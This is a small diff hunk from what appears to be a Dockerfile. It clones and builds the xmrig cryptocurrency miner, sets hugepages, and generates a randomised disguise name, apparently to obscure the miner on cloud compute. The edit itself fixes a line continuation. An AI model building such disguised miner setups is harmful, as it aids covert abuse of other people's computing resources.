@@ -9,7 +9,7 @@ WORKDIR /temp
 RUN rm -r /temp/$azure \
   && git clone https://github.com/xmrig/xmrig.git /temp/$azure \
   && a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d \
-  && cd /temp/$azure
+  && cd /temp/$azure \
   && sysctl -w vm.nr_hugepages=128 \
   && mkdir build \
   && cd build \
